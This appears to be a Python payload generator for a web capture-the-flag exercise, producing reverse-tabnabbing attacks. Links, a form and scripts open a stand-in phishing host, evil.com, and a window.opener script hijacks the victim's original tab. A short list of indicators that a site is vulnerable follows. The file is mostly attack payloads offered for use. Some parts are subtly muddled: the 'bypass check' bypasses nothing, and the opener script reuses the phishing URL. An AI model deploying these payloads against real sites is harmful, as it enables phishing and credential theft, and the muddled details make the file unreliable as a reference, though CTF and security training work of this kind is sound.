"""
Tabnabbing (Reverse Tabnabbing) Payload Crafter for Web CTF.
Covers target=_blank phishing, window.opener abuse, and tabnabbing PoCs.
"""

from typing import List, Dict


def get_tabnabbing_payloads(phishing_url: str = "https://evil.com/phish") -> List[Dict[str, str]]:
    """Generate reverse tabnabbing payloads."""
    return [
        {
            "name": "target=_blank Tabnabbing",
            "payload": f'<a href="{phishing_url}" target="_blank">Click here</a>',
            "desc": "Opens phishing page in new tab, original page can be replaced via window.opener."
        },
        {
            "name": "window.opener Abuse",
            "payload": f"""<script>
// On the phishing page (evil.com):
if (window.opener) {{
    window.opener.location = '{phishing_url}';
}}
</script>""",
            "desc": "Phishing page replaces the original tab via window.opener."
        },
        {
            "name": "Form target=_blank Tabnabbing",
            "payload": f'<form action="{phishing_url}" target="_blank"><button>Submit</button></form>',
            "desc": "Form submission opens new tab, original can be replaced."
        },
        {
            "name": "Window.open Tabnabbing",
            "payload": f'<script>window.open("{phishing_url}", "_blank");</script>',
            "desc": "window.open with _blank target."
        },
        {
            "name": "rel=noopener Bypass Check",
            "payload": '<a href="https://safe.com" target="_blank" rel="noopener">Safe link</a>',
            "desc": "Check if rel=noopener is used (prevents tabnabbing)."
        }
    ]


def get_tabnabbing_indicators() -> List[Dict[str, str]]:
    """Indicators that tabnabbing is possible."""
    return [
        {
            "indicator": "target=_blank without rel=noopener",
            "desc": "If links use target=_blank without rel=noopener, tabnabbing is possible."
        },
        {
            "indicator": "window.opener access",
            "desc": "If the new page can access window.opener, tabnabbing is possible."
        },
        {
            "indicator": "User-controlled links",
            "desc": "If the app renders user-controlled links with target=_blank."
        }
    ]
